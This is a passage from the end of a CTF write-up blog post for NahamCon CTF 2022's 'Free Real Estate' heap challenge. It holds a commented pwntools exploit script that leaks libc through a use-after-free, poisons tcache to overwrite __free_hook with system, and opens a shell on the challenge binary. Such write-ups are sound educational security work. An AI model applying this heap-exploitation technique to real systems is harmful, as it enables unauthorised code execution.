</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">show_property</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()
</span></span><span style="display:flex;"><span>    comment <span style="color:#555">=</span> r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()<span style="color:#555">.</span>split(<span style="color:#c30">b</span><span style="color:#c30">&#39;: &#39;</span>)[<span style="color:#f60">1</span>] <span style="color:#09f;font-style:italic"># We only care the comment value</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> comment
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">change_username</span>(r, ln, name):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;What is the length of your new name?: &#39;</span>, <span style="color:#366">str</span>(ln)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter your new name: &#39;</span>, name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After first connection, by default the binary will call malloc(0x40)</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># and use this heap chunk for property variable</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Enter your name: &#39;</span>, p64(<span style="color:#f60">0xdeadbeef</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Part 1: Leak Libc base address
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create big chunk for Comment</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-1: Street name</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-2: Comment</span>
</span></span><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x10</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x427</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Prevent consolidate</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-1 got freed -&gt; tcache</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-3: Street name</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Free all</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-2 got freed -&gt; unsorted_bin due to its large size</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Chunk-3 got freed -&gt; Tcache</span>
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Due to bug on remove_property, even though we create a new property without comment,</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the property&#39;s comment still point to the freed chunk, hence we can leak libc address</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># via show_property due to the fact that unsorted_bin point to libc main_arena + 0x60.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create new property without comment &amp; show its property</span>
</span></span><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x10</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>leaked_libc <span style="color:#555">=</span> u64(show_property(r)<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;leaked_libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_libc)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_libc <span style="color:#555">-</span> main_arena <span style="color:#555">-</span> <span style="color:#f60">0x60</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;libc_base: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
</span></span><span style="display:flex;"><span>free_hook <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;__free_hook&#39;</span>]
</span></span><span style="display:flex;"><span>system <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;__free_hook@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(free_hook)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;system@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(system)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Part 2: Overwrite __free_hook with system
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Final target will be to:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Tcache poisoning to overwrite the freed chunk pointer with __free_hook</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># We want to clean it up. To be able to call remove_property, we need to malloc(0x427+1)</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># to fill up the freed chunk of comment, so that we won&#39;t double free comment chunk.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># The trick is we can leverage change_username feature to do this</span>
</span></span><span style="display:flex;"><span>change_username(r, <span style="color:#f60">0x427</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Notice that now, username and comment still points to the same pointer</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># To make it points to different pointer, we simply create new property</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># and remove it.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Notes:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - The street chunk will use the unsorted bin cache by reducing its size</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   because we don&#39;t have any tcache yet with size 0xa1.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - The comment chunk will use the tcache[0x30]</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Also notes that:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - The stored size of username is 0x427+1</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - The username is still pointing to the unsorted bin chunk</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Now, everytime we try to alloc a chunk size that is &lt; unsorted bin chunk size</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   it will use the unsorted bin chunk by reducing its chunk size per alloc</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - And because the code is allowing us to change the username value without free &amp; malloc</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   if the size is &lt; stored size (0x427+1), basically after this moment, we can rewrite</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   new chunks those use the unsorted bin chunks via change username :)</span>
</span></span><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x89</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now username and comment isn&#39;t pointing to the same chunk</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Notice that due to the freed comment chunk is not nulled by remove_property,</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># not only we can leak the freed chunk content, we can also overwrite it via</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># edit_property.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Notice that the freed order in remove_property are:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Comment</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Street (and nulled it)</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Property (and nulled itself)</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># However, because we can only manipulate the freed comment chunk, we need to place the</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># freed comment chunk as the second entry of the tcache bins.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># How to achieve that? We can use the edit_property</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># We plan to manipulate tcache[0x60], so we set the chunk size to 0x49+1</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create two 0x60 chunks (street and comment)</span>
</span></span><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x49</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x49</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Edit the street name to higher chunk size.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now, tcache[0x60][0] = address of old street chunk</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x59</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now, call remove_property. It will freed comment, street, and property itself</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># State after remove:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># tcache_bins[0x60] = old street chunk &lt;- comment chunk</span>
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create new property without comment. We&#39;re going to overwrite the freed comment chunk</span>
</span></span><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Edit it to free_hook address</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After state:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># tcache_bins[0x60] = __free_hook &lt;- comment chunk</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x20</span>, p64(free_hook), <span style="color:#069;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Make malloc(0x49+1) to use the tcache_bins[0x60]</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># After state:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># tcache_bins[0x60] = __free_hook</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># street and comment pointing to the same chunk due to this</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x49</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x8</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Tricky part is here. Remember that:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - username&#39;s stored size is 0x478</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - username chunk address is lower than the current property chunk</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - So far, based on GDB, we have used the unsorted bin chunk</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   about 0x01+0x60+0x60+0x70</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - We want to modify the chunk size of the street, which is</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   the second 0x60 chunk starting from the address that username points</span>
</span></span><span style="display:flex;"><span>change_username(r, <span style="color:#f60">500</span>, p64(<span style="color:#f60">0</span>)<span style="color:#555">*</span><span style="color:#f60">31</span> <span style="color:#555">+</span> p64(<span style="color:#f60">0x51</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Change the street stored size to smaller size first</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x8</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Because we alloc larger size than 0x20, edit_property will free &amp; alloc.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># And because we forge the chunk size to 0x51, now this edit will:</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Free 0x50 chunk</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Malloc(0x49+1) to use the tcache_bins[0x60]. Because bins is pointing to</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#   __free_hook, the street name is now pointing to it</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x49</span>, p64(system), <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set the comment value to /bin/sh</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, p64(system), <span style="color:#f60">13</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;/bin/sh</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>, <span style="color:#069;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Free the comment, and we will call</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># system(&#39;/bin/sh\x00&#39;)</span>
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0</span>, p64(system), <span style="color:#f60">0x90</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>, <span style="color:#069;font-weight:bold">True</span>, <span style="color:#069;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h2>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">NahamCon CTF 2022</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#free-real-estate">Free Real Estate</a>
      <ul>
        <li><a href="#intro">Intro</a></li>
        <li><a href="#initial-analysis">Initial Analysis</a></li>
        <li><a href="#exploitation-plan">Exploitation Plan</a></li>
        <li><a href="#solution">Solution</a></li>
        <li><a href="#final-script">Final script</a></li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/nahamconctf">NahamConCTF</a>
            
                <a href="https://chovid99.github.io/tags/heap">heap</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/2022">2022</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       ¬© Copyright 
       2022 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
